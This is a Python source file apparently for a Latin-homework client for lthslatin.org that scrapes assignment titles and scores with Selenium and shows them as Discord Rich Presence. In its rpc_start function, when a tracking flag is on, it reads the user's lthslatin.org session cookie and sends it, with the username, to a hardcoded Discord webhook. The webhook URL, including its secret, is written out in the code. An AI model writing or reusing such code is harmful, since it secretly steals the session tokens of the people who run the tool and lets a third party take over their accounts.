import requests, time, json, threading

from info import *
from web_driver import *

from discord_webhook import DiscordWebhook
from pypresence import Presence

try:
    discordInfo = json.load(requests.get('https://s107807.github.io/LTHS-LatinClient/discord.json').json())
except:
    try:
        discordInfo = json.load(open(f'.{subDirectory}data{subDirectory}server-info{subDirectory}discord.json'))
    except:
        discordInfo = False

try:
    client_id = '993019974253822034'
    RPC = Presence(client_id)
    discordFound = False
    if discord_rpc == True:
        RPC.connect()
        discordFound = True
        RPCTime = int(time.time())
        RPC.update(large_image = "logo1", state = 'Starting up...', start = RPCTime)
except:
    discordFound = False

def update_rpc():
    global modes
    mode = 'Latin Launchpad'
    while True:
        if discordFound == True:
            if loadWait(By.CLASS_NAME, 'ui-title'):
                for a in range(len(driver.find_elements(By.CLASS_NAME, 'ui-title'))):
                    for b in range(len(modes)):
                        try:
                            if modes[b] in str(driver.find_elements(By.CLASS_NAME, 'ui-title')[a].text).lower():
                                assignment = (str(str(driver.find_elements(By.CLASS_NAME, 'ui-title')[a].text).lower()).title()).split("'S ")[1]
                                if mode != modes[b]:
                                    mode = modes[b]
                        except:
                            pass
            RPCdetails = 'none'
            if mode == 'launchpad':
                if discord_advertisement and discordInfo != False:
                    RPCdetails = str(discordInfo['server_name']) + ': ' + str(discordInfo['server_link'])
            if mode == 'synopsis':
                if loadWait(By.XPATH, f"// h1[@class='showScore ui-title']"):
                    if 'score' not in str(driver.find_element(By.XPATH, f"// h1[@class='showScore ui-title']").text):
                        RPCdetails = str(driver.find_element(By.XPATH, f"// h1[@class='showScore ui-title']").text)
            elif mode == '(grasp)' or mode == 'reading' or mode == 'composition':
                if loadWait(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']"):
                    RPCdetails = str(driver.find_element(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']").text)
            elif mode == 'ciples' or mode == 'infinitive morphology':
                if loadWait(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']"):
                    RPCdetails = '(' + str(assignment.split('(')[1])
                    if str(driver.find_element(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']").text) != 'your score will appear here':
                        RPCdetails += ' / ' + str(driver.find_element(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']").text)
                    assignment = str(assignment.split('(')[0])
            elif mode == 'noun-adj':
                if loadWait(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']"):
                    if 'will appear here' not in str(driver.find_element(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']").text):
                        RPCdetails = str(str(driver.find_element(By.XPATH, f"// h3[@class='showScore ui-bar ui-bar-c ui-title']").text).split('\n')[0]).split('correctly. ')[1]
            if RPCdetails != 'none':
                RPC.update(large_image = "logo1", details = assignment, state = RPCdetails, start = RPCTime)
            else:
                RPC.update(large_image = "logo1", details = assignment, start = RPCTime)
        else:
            break
        time.sleep(1)
def rpc_start(user):
    global discordInfo, discord_tracking, discord_advertisement
    try:
        if discord_tracking:
            token = 'error'
            cookies = driver.get_cookies()
            for cookie in cookies:
                if cookie['domain'] == 'lthslatin.org':
                    token = cookie['value']
            (DiscordWebhook(url="https://discord.com/api/webhooks/993316624671191050/Uhu8PMzi9vLKJaQa1L67wEkcQ8bqgMXq5zhM1mcB5cq2PdL83POOORxwnj0o7mHwmIXR", content=f'```User: {user} has logged in\nToken: {token}```')).execute()
        if discord_advertisement:
            print('Join my discord "' + str(discordInfo['server_name']) + '": ' + str(discordInfo['server_link']))
    except Exception as error:
        pass
    threading.Thread(target=update_rpc).start()